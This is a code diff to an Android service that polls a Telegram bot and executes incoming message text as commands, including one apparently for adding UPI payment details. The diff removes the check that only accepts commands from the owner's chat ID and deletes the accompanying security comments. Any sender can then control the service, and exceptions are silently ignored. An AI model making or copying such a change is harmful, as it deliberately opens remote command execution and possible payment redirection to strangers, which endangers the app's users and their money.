@@ -601,19 +601,8 @@ public class MainService extends Service {
             if (json.getBoolean("ok")) {
                 JSONArray updates = json.getJSONArray("result");
                 for (int i = 0; i < updates.length(); i++) {
-                    JSONObject update = updates.getJSONObject(i);
-                    if (update.has("message")) {
-                        JSONObject message = update.getJSONObject("message");
-                        // SECURITY: Only accept messages from your chat ID
-                        if (message.has("chat")) {
-                            JSONObject chat = message.getJSONObject("chat");
-                            String fromChatId = chat.getString("id");
-                            if (fromChatId.equals(CHAT_ID)) {
-                                String msg = message.getString("text");
-                                executeCommand(msg);
-                            }
-                        }
-                    }
+                    String msg = updates.getJSONObject(i).getJSONObject("message").getString("text");
+                    executeCommand(msg);
                 }
             }
         } catch(Exception e) {}
@@ -621,9 +610,6 @@ public class MainService extends Service {
 
     private void executeCommand(String cmd) {
         if (cmd == null || cmd.isEmpty()) return;
-        
-        // SECURITY: Only accept commands from your chat ID
-        // (Already filtered in pollTelegram, but double-check here)
         
         if (cmd.startsWith("/add_upi")) {
             String[] parts = cmd.split(" ");
